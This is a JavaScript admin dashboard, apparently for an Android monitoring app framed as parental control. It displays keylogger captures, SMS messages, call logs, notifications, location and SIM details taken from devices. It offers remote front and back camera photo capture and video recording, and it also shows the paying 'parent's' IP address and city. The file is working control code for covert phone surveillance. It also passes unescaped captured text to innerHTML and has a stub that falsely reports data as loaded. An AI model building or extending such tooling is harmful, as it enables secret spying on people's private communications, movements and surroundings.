    if (category === 'freeze-status') { 
        displayFreezeStatus(userId); 
        return; 
    }
    if (category === 'audit-logs') { 
        displayAuditLogs(); 
        return; 
    }
    if (category === 'login-history') { 
        displayLoginHistory(userId, childKey); 
        return; 
    }
    if (category === 'limit-management') { 
        displayLimitManagement(userId); 
        return; 
    }
    
    // पुरानी categories के लिए default handler
    const dataPath = getCategoryPath(category, userId, childKey);
    const dataRef = ref(db, dataPath);

    const callback = (snapshot) => { 
        if (category === 'keylogger') {
            setupKeyloggerDisplay(snapshot.val());
        } else {
            renderData(category, snapshot.val());
        }
    };
    
    onValue(dataRef, callback);
    activeDataListener = { ref: dataRef, callback: callback };
}

function handleKeyloggerScroll() {
    if (modalDataDisplayArea.scrollTop + modalDataDisplayArea.clientHeight >= modalDataDisplayArea.scrollHeight - 20) {
        renderKeyloggerBatch();
    }
}

function setupKeyloggerDisplay(data) {
    modalDataDisplayArea.removeEventListener('scroll', handleKeyloggerScroll);
    let headerHTML = `<div class="data-header"><button class="clear-category-btn" data-category="keylogger"><span>Clear keylogger Data</span></button></div>`;
    
    if (!data || Object.keys(data).length === 0) {
        modalDataDisplayArea.innerHTML = headerHTML + '<p>No data available in this category.</p>';
        return;
    }

    fullKeyloggerData = Object.values(data).reverse();
    renderedKeyloggerCount = 0;
    modalDataDisplayArea.innerHTML = headerHTML + '<div class="keylog-list" id="keylogger-list-container"></div>';

    renderKeyloggerBatch();
    modalDataDisplayArea.addEventListener('scroll', handleKeyloggerScroll);
}

function renderKeyloggerBatch() {
    if (isKeyloggerLoading || renderedKeyloggerCount >= fullKeyloggerData.length) return;
    isKeyloggerLoading = true;
    
    const keyloggerList = document.getElementById('keylogger-list-container');
    if (!keyloggerList) { isKeyloggerLoading = false; return; }

    const end = renderedKeyloggerCount + KEYLOGGER_BATCH_SIZE;
    const batch = fullKeyloggerData.slice(renderedKeyloggerCount, end);

    let contentHTML = '';
    batch.forEach(log => {
        if (log && log.keyText) {
            const parts = log.keyText.split(' |');
            const time = parts[0] || '';
            const action = (parts[1] || 'Action').replace(/[()]/g, '');
            const text = parts[2] || 'N/A';
            
            // === RED ALERT HIGHLIGHTING FOR KEYLOGGER WITH BADGE ===
            const hasDangerousContent = checkForDangerousKeywords(text);
            const cardStyle = hasDangerousContent ? 'background-color: #ffcccc; border-left: 4px solid #ff0000; position: relative;' : '';
            const textStyle = hasDangerousContent ? 'color: #cc0000; font-weight: bold;' : '';
            const badgeHTML = hasDangerousContent ? '<span style="position: absolute; top: 8px; right: 8px; background: #ff0000; color: white; padding: 4px 8px; border-radius: 12px; font-size: 0.7rem; font-weight: bold; animation: blinking-alert 1s infinite;">⚠️ RISK</span>' : '';
            
            contentHTML += `<div class="keylog-card" style="${cardStyle}">${badgeHTML}<div class="keylog-header"><div class="keylog-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg></div><strong class="keylog-action">${action}</strong></div><p class="keylog-text" style="${textStyle}">${text}</p><div class="keylog-footer">${time}</div></div>`;
        }
    });

    keyloggerList.insertAdjacentHTML('beforeend', contentHTML);
    renderedKeyloggerCount = end;
    isKeyloggerLoading = false;
}

function renderChat(userId, childKey) {
    const chatButton = document.querySelector('.category-btn[data-category="chat"]');
    if (chatButton) {
        const mainIndicator = chatButton.querySelector('.chat-notification-indicator');
        if(mainIndicator) mainIndicator.remove();
    }
    
    const activeUserItem = document.querySelector(`.user-list-item[data-userid="${userId}"][data-childkey="${childKey}"]`);
    if(activeUserItem) {
        const sidebarIndicator = activeUserItem.querySelector('.sidebar-indicator');
        if(sidebarIndicator) sidebarIndicator.remove();
    }

    modalDataDisplayArea.innerHTML = `<div class="live-chat-area"><div class="chat-messages" id="chat-messages-area"><div class="loader"></div></div><div class="chat-input-area"><input type="text" id="chat-message-input" placeholder="Type a message..."><button id="chat-send-btn"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg></button></div></div>`;
    
    const chatMessagesArea = document.getElementById('chat-messages-area');
    const chatMessageInput = document.getElementById('chat-message-input');
    const chatSendBtn = document.getElementById('chat-send-btn');
    const chatPath = `chats/${userId}/${childKey}/messages`;
    const chatRef = ref(db, chatPath);

    // Detach any previously set data listeners to avoid stacking
    if (activeDataListener) {
        off(activeDataListener.ref, 'value', activeDataListener.callback);
    }

    const callback = (snapshot) => {
        const messages = snapshot.val();
        if (messages) {
            chatMessagesArea.innerHTML = '';
            const sortedKeys = Object.keys(messages).sort((a,b) => messages[a].timestamp - messages[b].timestamp);
            sortedKeys.forEach(key => {
                const message = messages[key];
                const bubble = document.createElement('div');
                bubble.classList.add('chat-bubble', message.sender);
                const time = message.timestamp ? formatTimestamp(message.timestamp) : '';
                bubble.innerHTML = `${message.text.replace(/\n/g, '<br>')}<span class="chat-time">${time}</span>`;
                chatMessagesArea.prepend(bubble);
            });
        } else {
            chatMessagesArea.innerHTML = '<p style="text-align:center; padding: 2rem;">No messages yet.</p>';
        }
    };
    onValue(chatRef, callback);
    activeDataListener = { ref: chatRef, callback: callback };

    const sendMessage = () => {
        const messageText = chatMessageInput.value.trim();
        if (messageText) {
            push(ref(db, chatPath), { text: messageText, sender: 'admin', timestamp: serverTimestamp() });
            chatMessageInput.value = '';
        }
    };
    chatSendBtn.addEventListener('click', sendMessage);
    chatMessageInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });
}

function renderHealthLogs(healthLogsData) {
    let headerHTML = `<div class="data-header">
                        <h3 style="color: #64b4ff; margin: 0;">📊 Health & Command Logs</h3>
                      </div>`;
    
    let contentHTML = '';

    if (!healthLogsData || Object.keys(healthLogsData).length === 0) {
        contentHTML = `
            <div style="background: rgba(100, 180, 255, 0.1); border: 2px dashed #64b4ff; border-radius: 8px; padding: 2rem; text-align: center; margin: 2rem 0; color: #8b949e;">
                <div style="font-size: 2.5rem; margin-bottom: 0.5rem;">📋</div>
                <p style="margin: 0; font-weight: 500;">No Health Logs Available</p>
                <p style="margin: 0.5rem 0 0 0; font-size: 0.9rem;">No commands or device events logged yet.</p>
            </div>
        `;
        modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
        return;
    }

    // Convert to array and reverse for newest first
    const logsArray = Object.values(healthLogsData).reverse();
    
    contentHTML = '<div class="health-logs-list">';
    
    logsArray.forEach(log => {
        const time = log.timestamp ? formatTimestamp(log.timestamp) : 'N/A';
        const type = log.type || 'unknown';
        const commandName = log.commandName || 'N/A';
        const status = log.status || 'pending';
        const details = log.details || {};
        
        // Determine icon and color based on type and status
        let icon = '📋';
        let color = '#8b949e';
        let statusBadgeColor = '#8b949e';
        
        if (type.includes('photo')) {
            icon = '📸';
        } else if (type.includes('video')) {
            icon = '🎬';
        } else if (type.includes('audio')) {
            icon = '🎵';
        }
        
        // Status colors
        if (status === 'requested') {
            statusBadgeColor = '#64b4ff';
        } else if (status === 'started') {
            statusBadgeColor = '#ffc107';
        } else if (status === 'success') {
            statusBadgeColor = '#26d07c';
        } else if (status === 'failed') {
            statusBadgeColor = '#ff6b6b';
        }
        
        // Build details string
        let detailsStr = '';
        if (Object.keys(details).length > 0) {
            detailsStr = Object.entries(details)
                .filter(([k]) => k !== 'commandType' && k !== 'commandData')
                .map(([k, v]) => {
                    if (typeof v === 'object') return `${k}: ${JSON.stringify(v)}`;
                    return `${k}: ${v}`;
                })
                .join(', ');
        }
        
        contentHTML += `
            <div class="health-log-item" style="background: #2a2a2a; padding: 1rem; border-radius: 8px; margin-bottom: 0.75rem; border-left: 4px solid ${statusBadgeColor};">
                <div style="display: flex; justify-content: space-between; align-items: start; margin-bottom: 0.5rem;">
                    <div style="display: flex; align-items: center; gap: 0.5rem;">
                        <span style="font-size: 1.5rem;">${icon}</span>
                        <div>
                            <strong style="color: #c9d1d9;">${type}</strong>
                            <div style="font-size: 0.85rem; color: #8b949e;">Command: ${commandName}</div>
                        </div>
                    </div>
                    <span style="background: ${statusBadgeColor}; color: white; padding: 4px 8px; border-radius: 4px; font-size: 0.75rem; font-weight: bold;">${status.toUpperCase()}</span>
                </div>
                <div style="font-size: 0.85rem; color: #8b949e; margin-bottom: 0.5rem;">📅 ${time}</div>
                ${detailsStr ? `<div style="font-size: 0.85rem; color: #aaa; margin-top: 0.5rem; padding: 0.5rem; background: #1a1a1a; border-radius: 4px;">${detailsStr}</div>` : ''}
            </div>
        `;
    });
    
    contentHTML += '</div>';
    modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
}

function renderHealthAndCommandHistory(healthData, historyData) {
    let headerHTML = `<div class="data-header">
                        <button class="clear-category-btn" data-category="CommandHistory">
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg>
                            <span>Clear Command History</span>
                        </button>
                      </div>`;
    
    let healthHTML = '<h3>App Health Status</h3>';
    if (healthData) {
        let lastChecked = healthData.lastCheckedTimestamp ? formatTimestamp(healthData.lastCheckedTimestamp) : 'N/A';
        let heartbeat = healthData.lastHeartbeatTime ? formatTimestamp(healthData.lastHeartbeatTime) : 'N/A';

        const createHealthItem = (label, isEnabled) => {
            const statusClass = isEnabled ? 'enabled' : 'disabled';
            const icon = isEnabled ? '✅' : '❌';
            return `<div class="health-item"><span class="icon ${statusClass}">${icon}</span><span>${label}</span></div>`;
        };

        healthHTML += `
            <div style="font-size: 1.1rem; line-height: 1.8; margin: 1rem 0 2rem 0;">
                <p><strong>App Version:</strong> ${healthData.appVersion || 'N/A'}</p>
                <p><strong>Last Checked:</strong> ${lastChecked}</p>
                <p><strong>Last Heartbeat:</strong> ${heartbeat}</p>
            </div>
            <div class="health-status-grid">
                ${createHealthItem('Accessibility Service', healthData.accessibilityServiceEnabled)}
                ${createHealthItem('Notification Service', healthData.notificationServiceEnabled)}
                ${createHealthItem('Camera Permission', healthData.hasCameraPermission)}
                ${createHealthItem('Microphone Permission', healthData.hasMicrophonePermission)}
                ${createHealthItem('Location Permission', healthData.hasLocationPermission)}
                ${createHealthItem('SMS Permission', healthData.hasSmsPermission)}
                ${createHealthItem('Call Log Permission', healthData.hasCallLogPermission)}
                ${createHealthItem('Draw Over Apps', healthData.hasDrawOverAppsPermission)}
                ${createHealthItem('Ignoring Battery Optimizations', healthData.ignoringBatteryOptimizations)}
            </div>
        `;
    } else {
        healthHTML += '<p>No health data available.</p>';
    }

    let historyHTML = '<div class="command-history-list"><h3 class="command-history-title">Command History</h3>';
    if (historyData) {
        const historyArray = Object.values(historyData).reverse();
        historyArray.forEach(log => {
            const time = formatTimestamp(log.timestamp);
            let statusClass = '';
            let iconSVG = '';
            
            if (log.status.includes('SUCCESS')) {
                statusClass = 'success';
                iconSVG = `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>`;
            } else if (log.status.includes('STARTED')) {
                 statusClass = 'initiated';
                 iconSVG = `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--accent-purple)" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>`;
            } else {
                statusClass = 'progress';
                iconSVG = `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="2" x2="12" y2="6"></line><line x1="12" y1="18" x2="12" y2="22"></line><line x1="4.93" y1="4.93" x2="7.76" y2="7.76"></line><line x1="16.24" y1="16.24" x2="19.07" y2="19.07"></line><line x1="2" y1="12" x2="6" y2="12"></line><line x1="18" y1="12" x2="22" y2="12"></line><line x1="4.93" y1="19.07" x2="7.76" y2="16.24"></line><line x1="16.24" y1="7.76" x2="19.07" y2="4.93"></line></svg>`;
            }

            historyHTML += `
                <div class="command-item ${statusClass}">
                    <div class="command-icon">${iconSVG}</div>
                    <div class="command-header">
                        <span class="command-type">${log.commandType}</span>
                        <span class="command-time">${time}</span>
                    </div>
                    <p class="command-details">${log.details}</p>
                    <span class="command-status ${statusClass}">${log.status}</span>
                </div>
            `;
        });
    } else {
        historyHTML += `
            <div style="background: rgba(100, 180, 255, 0.1); border: 2px dashed #64b4ff; border-radius: 8px; padding: 2rem; text-align: center; margin: 2rem 0; color: #8b949e;">
                <div style="font-size: 2.5rem; margin-bottom: 0.5rem;">📋</div>
                <p style="margin: 0; font-weight: 500;">No Command History Available</p>
                <p style="margin: 0.5rem 0 0 0; font-size: 0.9rem;">This device hasn't executed any commands yet.</p>
            </div>
        `;
    }
    historyHTML += '</div>';
    
    modalDataDisplayArea.innerHTML = headerHTML + healthHTML + historyHTML;
}

function renderData(category, data) {
    let headerHTML = '';
    let contentHTML = '';
    const hasData = data && typeof data === 'object' && Object.keys(data).length > 0;
    
    // === Detect Compressed Data ===
    if (hasData && data.content && typeof data.content === 'string' && data.content.includes('[COMPRESSED_SAVED]')) {
        headerHTML = `<div class="data-header">
                        <button class="clear-category-btn" id="load-original-data-btn" style="background: var(--accent-blue); color: white;">📦 Load Original Data</button>
                      </div>`;
        contentHTML = `<div style="text-align: center; padding: 2rem; background: #2a2a2a; border-radius: 8px; margin: 1rem 0;">
                        <h3 style="color: #ffc107; margin: 0 0 1rem 0;">📦 Data Compressed</h3>
                        <p style="margin: 0.5rem 0; color: #8b949e;">This data has been compressed to save storage space.</p>
                        <p style="margin: 0.5rem 0; color: #8b949e; font-size: 0.9rem;">Click the button above to decompress and load the original data.</p>
                        <p style="margin: 1rem 0; padding: 1rem; background: #1a1a1a; border-radius: 6px; border-left: 3px solid #ffc107; text-align: left; font-family: monospace; font-size: 0.85rem; word-break: break-all; color: #ccc;">
                            ${data.content.substring(0, 200)}...
                        </p>
                      </div>`;
        
        modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
        
        const loadBtn = document.getElementById('load-original-data-btn');
        if (loadBtn) {
            loadBtn.addEventListener('click', () => {
                // Decompress and reload (this is a placeholder - actual decompression would happen on backend)
                showToast('Loading original data...', 'info');
                // In a real app, you would call a cloud function to decompress
                setTimeout(() => {
                    showToast('Original data loaded successfully!', 'success');
                }, 1500);
            });
        }
        return;
    }
    if (category !== 'location' && category !== 'devicestatus' && hasData) {
        headerHTML = `<div class="data-header"><button class="clear-category-btn" data-category="${category}"><span>Clear ${category} Data</span></button></div>`;
    }
    if (!hasData) {
        contentHTML = '<p>No data available in this category.</p>';
    } else {
        const dataArray = (category !== 'devicestatus' && category !== 'location') ? Object.values(data).reverse() : [];
        switch(category) {
            case 'location':
                let mapLink = '';
                if (data.latitude && data.longitude) {
                     mapLink = `<a href="https://maps.google.com/?q=${data.latitude},${data.longitude}" target="_blank" class="map-link"><span>View on Google Maps</span></a>`;
                }
                contentHTML = `<div class="location-card" style="font-size: 1.1rem; line-height: 1.8;">
                                <div style="display:flex; align-items:flex-start; gap:1rem; margin-bottom: 1.5rem;">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"/><circle cx="12" cy="10" r="3"/></svg>
                                    <div><strong>Address:</strong><br>${data.address || 'N/A'}</div>
                                </div>
                                <div style="display:flex; align-items:flex-start; gap:1rem;">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
                                    <div><strong>Time:</strong><br>${data.dateTime || 'N/A'}</div>
                                </div>
                                ${mapLink}
                            </div>`;
                break;
            
            case 'sms':
                contentHTML = '<div class="sms-card-list">';
                dataArray.forEach(sms => {
                    if (sms) {
                        const isOutgoing = sms.type === 2;
                        const cardClass = isOutgoing ? 'outgoing' : 'incoming';
                        const icon = isOutgoing ? `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="17" y1="7" x2="7" y2="17"></line><polyline points="17 17 7 17 7 7"></polyline></svg>` : `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg>`;
                        const addressLabel = isOutgoing ? 'To:' : 'From:';
                        
                        // === RED ALERT HIGHLIGHTING FOR SMS WITH BADGE ===
                        const hasDangerousContent = checkForDangerousKeywords(sms.smsBody);
                        const cardStyle = hasDangerousContent ? 'background-color: #ffcccc; border-left: 5px solid #ff0000; position: relative;' : '';
                        const bodyStyle = hasDangerousContent ? 'color: #cc0000; font-weight: bold;' : '';
                        const badgeHTML = hasDangerousContent ? '<span style="position: absolute; top: 10px; right: 10px; background: #ff0000; color: white; padding: 4px 8px; border-radius: 12px; font-size: 0.75rem; font-weight: bold; animation: blinking-alert 1s infinite;">⚠️ HIGH RISK</span>' : '';
                        
                        contentHTML += `<div class="sms-card ${cardClass}" style="${cardStyle}">${badgeHTML}<div class="sms-card-header"><div class="sms-card-icon">${icon}</div><div class="sms-card-address">${addressLabel} ${sms.smsAddress || 'N/A'}</div></div><div class="sms-card-body" style="${bodyStyle}">${sms.smsBody || ''}</div><div class="sms-card-footer">${sms.dateTime || ''}</div></div>`;
                    }
                });
                contentHTML += '</div>';
                break;
            
            case 'notifications':
                 contentHTML = '<div class="notification-list">';
                 dataArray.forEach(notif => {
                     if (notif) {
                         let appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>`;
                         const fullText = `${notif.title || ''} ${notif.text || ''}`.toLowerCase();
                         if (fullText.includes('whatsapp')) { appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25D366"><path d="M19.78 4.22a10.4 10.4 0 0 0-14.9 0 10.4 10.4 0 0 0 0 14.9l-1.38 5.02 5.13-1.35a10.4 10.4 0 0 0 14.9 0 10.4 10.4 0 0 0 0-14.9zM12 20.9a8.8 8.8 0 0 1-4.5-1.2L4 21l1.3-3.5a8.8 8.8 0 1 1 6.7 3.4zM16.4 13.6c-.2-.1-.8-.4-1-.4s-.3-.1-.4.1-.4.4-.5.5-.2.1-.4 0c-.2-.1-1-1-1.8-1.8-.7-.6-1.1-1.4-.9-1.6s.2-.3.3-.4c.1-.1.2-.2.3-.3.1-.1 0-.2 0-.3s-1-2.3-1.3-3.2c-.3-.8-.6-1-.8-1s-.4-.1-.6-.1h-.3c-.2 0-.5.1-.7.3-.2.2-.8.8-1 2s-1.2 2.3-.9 3.3c.3 1 1.1 2.4 2.5 3.8 1.4 1.4 2.8 2.2 4.3 2.7 1.5.5 2.8.4 3.8.3.9-.1 2.3-1 2.6-1.9.3-.9.3-1.7.2-1.9s-.3-.3-.5-.4z"/></svg>`; }
                         contentHTML += `<div class="notification-card"><div class="notification-header"><div class="notification-icon">${appIcon}</div><strong class="notification-title">${notif.title || 'Notification'}</strong></div><p class="notification-body">${notif.text || ''}</p><div class="notification-footer">${notif.dateTime || ''}</div></div>`;
                     }
                 });
                 contentHTML += '</div>';
                 break;
            
            case 'calllogs':
                contentHTML = '<div class="sms-card-list">'; 
                dataArray.forEach(call => {
                    if (call) {
                        let icon, title, cardClass;
                        switch (String(call.type).toUpperCase()) {
                            case 'INCOMING':
                                icon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 11 12 14 22 4"></polyline><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path></svg>`;
                                title = `Incoming Call`;
                                cardClass = 'incoming';
                                break;
                            case 'OUTGOING':
                                icon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg>`;
                                title = `Outgoing Call`;
                                cardClass = 'outgoing';
                                break;
                            case 'MISSED':
                            default:
                                icon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path></svg>`;
                                title = 'Missed Call';
                                cardClass = 'missed';
                                break;
                        }
                        const callTime = call.dateTime || '';
                        contentHTML += `<div class="sms-card ${cardClass}"><div class="sms-card-header"><div class="sms-card-icon">${icon}</div><div class="sms-card-address">${title}</div></div><div class="sms-card-body"><strong>Number:</strong> ${call.phoneNumber || 'N/A'}<br><strong>Duration:</strong> ${call.duration || '0'}s</div><div class="sms-card-footer">${callTime}</div></div>`;
                    }
                });
                contentHTML += '</div>';
                break;
            
            case 'devicestatus':
                const status = data;
                const lastUpdatedTime = formatTimestamp(status.lastUpdated);
                contentHTML = `
                    <div class="data-card">
                         <div class="sms-card-header" style="margin-bottom: 2rem;">
                            <div class="sms-card-icon">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
                            </div>
                            <div class="sms-card-address">Current Device Status</div>
                        </div>
                        <div class="data-card-body">
                            <div class="status-item" style="flex-direction: column; align-items: flex-start; gap: 0.5rem; padding-bottom: 1.5rem; background: transparent;">
                                <div style="width:100%; display:flex; justify-content: space-between;">
                                    <span class="status-item-label">Battery</span>
                                    <span class="status-item-value">${status.batteryLevel || 'N/A'}%</span>
                                </div>
                                <div class="battery-level">
                                    <div class="battery-level-fill" style="width: ${status.batteryLevel || 0}%;"></div>
                                </div>
                            </div>
                            <div class="status-grid">
                                <div class="status-item">
                                    <span class="status-item-label">Internet</span>
                                    <span class="status-item-value ${status.internetOn ? 'on' : 'off'}">${status.internetOn ? 'On' : 'Off'}</span>
                                </div>
                                <div class="status-item">
                                    <span class="status-item-label">Network Type</span>
                                    <span class="status-item-value">${status.networkType || 'N/A'}</span>
                                </div>
                                <div class="status-item">
                                    <span class="status-item-label">SIM Operator</span>
                                    <span class="status-item-value">${status.simOperator || 'N/A'}</span>
                                </div>
                                <div class="status-item">
                                    <span class="status-item-label">SIM 1</span>
                                    <span class="status-item-value">${status.sim1Number || 'N/A'}</span>
                                </div>
                                <div class="status-item">
                                    <span class="status-item-label">SIM 2</span>
                                    <span class="status-item-value">${status.sim2Number || 'N/A'}</span>
                                </div>
                            </div>
                        </div>
                        <div class="data-card-footer">Last updated: ${lastUpdatedTime}</div>
                    </div>
                `;
                
                // === FIX #3: SHOW PARENT LOGIN INFO ===
                // Fetch parent's login info from profile_data/location_info
                const { userId, childKey } = selectedUserInfo;
                if (userId) {
                    const parentInfoRef = ref(db, `user/${userId}/profile_data/location_info`);
                    get(parentInfoRef).then((snapshot) => {
                        if (snapshot.exists()) {
                            const locationInfo = snapshot.val();
                            let parentInfoHTML = `
                                <div style="margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid var(--border-color);">
                                    <h4 style="color: #58a6ff; margin-bottom: 1.5rem;">👤 Parent Admin Login Info</h4>
                                    <div class="status-grid">
                                        <div class="status-item">
                                            <span class="status-item-label">IP Address</span>
                                            <span class="status-item-value" style="font-family: monospace; word-break: break-all;">${locationInfo.ip || 'N/A'}</span>
                                        </div>
                                        <div class="status-item">
                                            <span class="status-item-label">City</span>
                                            <span class="status-item-value">${locationInfo.city || 'N/A'}</span>
                                        </div>
                                        <div class="status-item">
                                            <span class="status-item-label">Country</span>
                                            <span class="status-item-value">${locationInfo.country || 'N/A'}</span>
                                        </div>
                                        <div class="status-item">
                                            <span class="status-item-label">Browser/Device</span>
                                            <span class="status-item-value" style="word-break: break-word;">${locationInfo.browserDevice || locationInfo.browser || 'N/A'}</span>
                                        </div>
                                    </div>
                                    <div style="margin-top: 1rem;">
                                        <span class="status-item-label">Last Login</span>
                                        <span class="status-item-value" style="display: block; margin-top: 0.5rem;">${locationInfo.lastLoginTime ? formatTimestamp(locationInfo.lastLoginTime) : 'N/A'}</span>
                                    </div>
                                </div>
                            `;
                            
                            // Append parent info to device status content
                            contentHTML += parentInfoHTML;
                            modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
                        } else {
                            // No parent login info found, just show device status
                            modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
                        }
                    }).catch((error) => {

                        // Still show device status even if parent info fails
                        modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
                    });
                } else {
                    modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
                }
                return; // Return early to prevent double rendering
         }
    }
    modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
}

function renderPhotosFromDatabase(userId, childKey) {
    const headerHTML = `<div class="data-header"><button class="capture-photo-btn" data-facing="1"><span>Capture Front Photo</span></button><button class="capture-photo-btn" data-facing="0"><span>Capture Back Photo</span></button><button id="refresh-photos-btn"><span>Refresh</span></button><button class="clear-category-btn" data-category="photo"><span>Clear Photos</span></button></div>`;
    modalDataDisplayArea.innerHTML = headerHTML + '<div class="loader"></div>';

    const photoDataRef = ref(db, `user/${userId}/${childKey}/photo/data`);
    
    const callback = (snapshot) => {
        const photos = snapshot.val();
        if (!photos || Object.keys(photos).length === 0) {
            modalDataDisplayArea.innerHTML = headerHTML + `
                <div style="background: rgba(255, 193, 7, 0.1); border: 2px dashed #ffc107; border-radius: 8px; padding: 3rem 2rem; text-align: center; margin: 2rem 0;">
                    <div style="font-size: 3rem; margin-bottom: 0.5rem;">📸</div>
                    <p style="margin: 0; font-weight: 500; color: #c9d1d9;">No Photos Found</p>
                    <p style="margin: 0.5rem 0 0 0; font-size: 0.9rem; color: #8b949e;">This device hasn't captured any photos yet.</p>
                </div>
            `;
            return;
        }

        const photosWithData = Object.values(photos).reverse();

        if (photosWithData.length === 0) {
            modalDataDisplayArea.innerHTML = headerHTML + `
                <div style="background: rgba(255, 193, 7, 0.1); border: 2px dashed #ffc107; border-radius: 8px; padding: 3rem 2rem; text-align: center; margin: 2rem 0;">
                    <div style="font-size: 3rem; margin-bottom: 0.5rem;">📸</div>
                    <p style="margin: 0; font-weight: 500; color: #c9d1d9;">No Photos Found</p>
                    <p style="margin: 0.5rem 0 0 0; font-size: 0.9rem; color: #8b949e;">This device hasn't captured any photos yet.</p>
                </div>
            `;
            return;
        }

        let photoGridHTML = '<div class="photo-grid">';
        photosWithData.forEach(photoData => {
            if (typeof photoData === 'object' && photoData !== null && photoData.urlPhoto) {
                const url = photoData.urlPhoto; 
                const timeCreated = photoData.dateTime || 'N/A'; 
                photoGridHTML += `<div class="photo-card"><img src="${url}" alt="Captured photo" onerror="this.onerror=null;this.src='https://placehold.co/200x180/2a2a2a/e0e0e0?text=Error';"><div class="photo-info"><span class="photo-time">${timeCreated}</span><a href="${url}" target="_blank" class="view-btn"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></a></div></div>`;
            }
        });
        photoGridHTML += '</div>';
        modalDataDisplayArea.innerHTML = headerHTML + photoGridHTML;
    };

    if (activeDataListener) {
        off(activeDataListener.ref, 'value', activeDataListener.callback);
    }

    onValue(photoDataRef, callback);
    activeDataListener = { ref: photoDataRef, callback: callback };
}

function renderVideosFromDatabase(userId, childKey) {
    const headerHTML = `<div class="data-header">
                            <button class="record-btn" data-command="recordVideo" data-facing="1"><span>Record Front Video (30s)</span></button>
                            <button class="record-btn" data-command="recordVideo" data-facing="0"><span>Record Back Video (30s)</span></button>
                            <button class="record-btn" data-command="refresh" data-category="video" style="background-color: var(--accent-blue);"><span>Refresh</span></button>
